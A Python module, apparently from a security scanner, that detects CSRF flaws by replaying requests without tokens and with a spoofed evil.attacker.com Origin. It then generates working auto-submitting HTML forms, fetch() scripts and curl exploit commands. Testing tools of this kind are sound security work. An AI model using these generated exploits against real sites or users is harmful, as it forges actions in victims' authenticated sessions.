"""
CSRF Detection Engine — finds CSRF vulnerabilities and crafts working HTML PoC.

Strategy (ref: HackTricks CSRF):
  1. Identify state-changing endpoints (POST/PUT/DELETE + form/JSON body)
  2. Check if CSRF token exists in form/header (X-CSRF-Token, _csrf, etc.)
  3. Test whether endpoint accepts requests WITHOUT the CSRF token
  4. Test whether endpoint accepts requests from a DIFFERENT Origin
  5. Verify the state change actually happened (compare before/after state)
  6. Craft exploitable HTML PoC with auto-submitting form

Anti-hallucination:
  - A finding is only reported if the state-changing request SUCCEEDS
    (HTTP 200/201/204) without CSRF token
  - AND the response differs from the baseline (authenticated) request
    in a way that confirms the action happened
  - OR the before/after state comparison shows the change was applied
"""
from __future__ import annotations

import re
import uuid
from dataclasses import dataclass
from typing import Optional
from urllib.parse import urlparse

import httpx


# ---------------------------------------------------------------------------
# CSRF token field names to look for
# ---------------------------------------------------------------------------

_CSRF_FIELD_NAMES = [
    "csrf_token", "_csrf", "csrftoken", "csrf", "xsrf_token", "_xsrf",
    "authenticity_token", "verification_token", "x-csrf-token", "requestverificationtoken",
    "_token", "token", "__RequestVerificationToken",
]

_CSRF_HEADER_NAMES = [
    "X-CSRF-Token", "X-CSRF-TOKEN", "X-Requested-With", "X-XSRF-Token",
    "X-CSRFToken", "CSRF-Token", "Anti-CSRF-Token",
]

# State-changing HTTP methods
_STATE_CHANGING_METHODS = {"POST", "PUT", "PATCH", "DELETE"}

# Indicators that an action succeeded in the response body
_SUCCESS_INDICATORS = (
    '"success"', '"ok"', '"created"', '"updated"', '"deleted"', '"done"',
    '"id":', '"message":', '"status": "ok"', '"status":"ok"',
    '"result":', '"data":', '"affected"', '"modified"',
)


# ---------------------------------------------------------------------------
# CSRF Detection Result
# ---------------------------------------------------------------------------

@dataclass
class CsrfResult:
    vulnerable: bool = False
    endpoint: str = ""
    method: str = ""
    no_token_status: int = 0
    cross_origin_status: int = 0
    state_changed: bool = False
    samesite_cookie: str = ""  # "None", "Lax", "Strict", or "missing"
    html_poc: str = ""
    curl_poc: str = ""
    description: str = ""


# ---------------------------------------------------------------------------
# CSRF token detection in HTML/JSON
# ---------------------------------------------------------------------------

def find_csrf_token_in_html(html: str) -> Optional[str]:
    """Find CSRF token in HTML form hidden inputs."""
    for name in _CSRF_FIELD_NAMES:
        # <input type="hidden" name="csrf_token" value="ABC123">
        pattern = re.compile(
            rf'<input[^>]+name=["\']?{re.escape(name)}["\']?[^>]+value=["\']([^"\']+)["\']',
            re.IGNORECASE,
        )
        m = pattern.search(html)
        if m:
            return m.group(1)
        # Also try: <meta name="csrf-token" content="ABC123">
        meta = re.compile(
            rf'<meta[^>]+name=["\']?{re.escape(name)}["\']?[^>]+content=["\']([^"\']+)["\']',
            re.IGNORECASE,
        )
        m = meta.search(html)
        if m:
            return m.group(1)
    return None


def find_csrf_in_response_headers(headers: dict) -> Optional[str]:
    """Find CSRF token in response headers (cookie or custom header)."""
    for h in _CSRF_HEADER_NAMES:
        val = headers.get(h) or headers.get(h.lower())
        if val:
            return val
    return None


def parse_samesite(set_cookie_header: str) -> str:
    """Extract SameSite value from Set-Cookie header."""
    m = re.search(r"SameSite=([A-Za-z]+)", set_cookie_header, re.IGNORECASE)
    if m:
        return m.group(1).capitalize()
    return "missing"


# ---------------------------------------------------------------------------
# HTML PoC Generator
# ---------------------------------------------------------------------------

def craft_html_poc(
    target_url: str,
    method: str,
    fields: dict,
    content_type: str = "form",
    target_origin: str = "https://target.com",
    attacker_origin: str = "https://evil.attacker.com",
) -> str:
    """
    Craft a self-submitting HTML form that exploits a CSRF vulnerability.
    Generates a complete, runnable HTML file.
    """
    parsed = urlparse(target_url)
    origin_host = parsed.netloc

    if content_type == "json":
        # For JSON endpoints: use fetch() with no-cors
        fields_json = str(fields).replace("'", '"')
        return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC — {origin_host}</title></head>
<body>
<h2>CSRF PoC — Auto-submitting JSON request</h2>
<p>Target: <code>{target_url}</code></p>
<p>This page auto-sends a cross-origin {method} request when loaded.</p>
<script>
// CSRF via Fetch API with no-cors (works when CORS not properly configured)
fetch('{target_url}', {{
  method: '{method}',
  credentials: 'include',  // sends cookies automatically
  headers: {{
    'Content-Type': 'application/json',
  }},
  body: JSON.stringify({fields_json}),
}})
.then(r => console.log('Status:', r.status))
.catch(e => console.log('Error:', e));
</script>
<p>Victim must be authenticated on <strong>{origin_host}</strong></p>
<p>Attack origin: <strong>{attacker_origin}</strong></p>
</body>
</html>"""

    # Form-based PoC (works even with strict CORS if SameSite != Strict)
    hidden_inputs = "\n".join(
        f'  <input type="hidden" name="{k}" value="{v}">'
        for k, v in fields.items()
    )
    return f"""<!DOCTYPE html>
<html>
<head><title>CSRF PoC — {origin_host}</title></head>
<body onload="document.getElementById('csrf-form').submit()">
<h2>CSRF PoC — Auto-submitting form</h2>
<p>Target: <code>{target_url}</code></p>
<form id="csrf-form" action="{target_url}" method="{method}" style="display:none">
{hidden_inputs}
  <input type="submit" value="Submit">
</form>
<p>Victim must be authenticated on <strong>{origin_host}</strong></p>
<p>Attack origin: <strong>{attacker_origin}</strong></p>
<noscript>
  <form action="{target_url}" method="{method}">
{hidden_inputs}
    <input type="submit" value="Click me (CSRF bait)">
  </form>
</noscript>
</body>
</html>"""


# ---------------------------------------------------------------------------
# CSRF Engine
# ---------------------------------------------------------------------------

class CsrfEngine:
    """
    Full CSRF detection engine:
    1. Test endpoint without CSRF token → does it still succeed?
    2. Test endpoint with foreign Origin header → is it blocked?
    3. Verify state change happened (check before/after)
    4. Report with crafted HTML PoC
    """

    async def test_endpoint(
        self,
        client: httpx.AsyncClient,
        url: str,
        method: str,
        payload: dict,
        auth_session: dict,           # {"headers": {...}, "cookies": {...}}
        content_type: str = "form",   # "form" or "json"
        get_state_url: str = "",      # URL to check before/after state
    ) -> CsrfResult:
        result = CsrfResult(endpoint=url, method=method)
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # --- Baseline: authenticated request WITH full session ---
        baseline_resp = await self._send(
            client, url, method, payload,
            {**auth_session.get("headers", {}), "Content-Type": self._ct(content_type)},
            auth_session.get("cookies", {}),
            content_type,
        )
        if baseline_resp is None or baseline_resp.status_code not in (200, 201, 204):
            return result  # Endpoint doesn't work normally — skip

        # --- Test 1: No CSRF token (strip token from payload) ---
        stripped_payload = {k: v for k, v in payload.items()
                            if k.lower() not in _CSRF_FIELD_NAMES}
        no_token_resp = await self._send(
            client, url, method, stripped_payload,
            {**auth_session.get("headers", {}), "Content-Type": self._ct(content_type)},
            auth_session.get("cookies", {}),
            content_type,
        )
        if no_token_resp is not None:
            result.no_token_status = no_token_resp.status_code

        # --- Test 2: Cross-Origin request ---
        cross_origin_resp = await self._send(
            client, url, method, stripped_payload,
            {
                **auth_session.get("headers", {}),
                "Content-Type": self._ct(content_type),
                "Origin": "https://evil.attacker.com",
                "Referer": "https://evil.attacker.com/csrf-poc.html",
            },
            auth_session.get("cookies", {}),
            content_type,
        )
        if cross_origin_resp is not None:
            result.cross_origin_status = cross_origin_resp.status_code

        # --- Test 3: State change verification ---
        if get_state_url:
            before_state = await self._get_state(client, get_state_url, auth_session)

        # Check SameSite on session cookie
        for resp in (baseline_resp, no_token_resp, cross_origin_resp):
            if resp:
                sc = resp.headers.get("set-cookie", "")
                if sc:
                    result.samesite_cookie = parse_samesite(sc)
                    break

        # Decision: vulnerable if cross-origin POST accepted (200/201/204)
        # AND no CSRF token was required
        cross_ok = result.cross_origin_status in (200, 201, 204)
        no_token_ok = result.no_token_status in (200, 201, 204)
        samesite_unsafe = result.samesite_cookie in ("missing", "None", "Lax")

        if (cross_ok or no_token_ok) and samesite_unsafe:
            result.vulnerable = True

            # Verify state actually changed
            if get_state_url:
                after_state = await self._get_state(client, get_state_url, auth_session)
                result.state_changed = before_state != after_state

            # Craft PoC
            result.html_poc = craft_html_poc(url, method, stripped_payload, content_type)
            result.curl_poc = self._build_curl_poc(url, method, stripped_payload, content_type)
            result.description = (
                f"CSRF vulnerability at {url}. "
                f"Cross-origin {method} returns HTTP {result.cross_origin_status} "
                f"(no CSRF token required). "
                f"SameSite cookie policy: {result.samesite_cookie}. "
                + ("State change confirmed." if result.state_changed else "")
            )

        return result

    async def _send(
        self, client, url, method, payload, headers, cookies, content_type,
    ) -> Optional[httpx.Response]:
        try:
            if content_type == "json":
                return await client.request(
                    method, url, json=payload, headers=headers, cookies=cookies,
                )
            else:
                return await client.request(
                    method, url, data=payload, headers=headers, cookies=cookies,
                )
        except Exception:
            return None

    async def _get_state(
        self, client, url, auth_session,
    ) -> str:
        try:
            r = await client.get(
                url,
                headers=auth_session.get("headers", {}),
                cookies=auth_session.get("cookies", {}),
            )
            return r.text[:500]
        except Exception:
            return ""

    def _ct(self, content_type: str) -> str:
        return "application/json" if content_type == "json" else "application/x-www-form-urlencoded"

    def _build_curl_poc(
        self, url: str, method: str, payload: dict, content_type: str,
    ) -> str:
        if content_type == "json":
            import json as _json
            body = _json.dumps(payload)
            return (
                f"# CSRF exploit — send from any origin while victim is logged in:\n"
                f"curl -s -X {method} '{url}' \\\n"
                f"  -H 'Content-Type: application/json' \\\n"
                f"  -H 'Origin: https://evil.attacker.com' \\\n"
                f"  -b '<VICTIM_COOKIE_HERE>' \\\n"
                f"  -d '{body}'"
            )
        else:
            form_data = "&".join(f"{k}={v}" for k, v in payload.items())
            return (
                f"# CSRF exploit — send from any origin while victim is logged in:\n"
                f"curl -s -X {method} '{url}' \\\n"
                f"  -H 'Content-Type: application/x-www-form-urlencoded' \\\n"
                f"  -H 'Origin: https://evil.attacker.com' \\\n"
                f"  -b '<VICTIM_COOKIE_HERE>' \\\n"
                f"  -d '{form_data}'"
            )
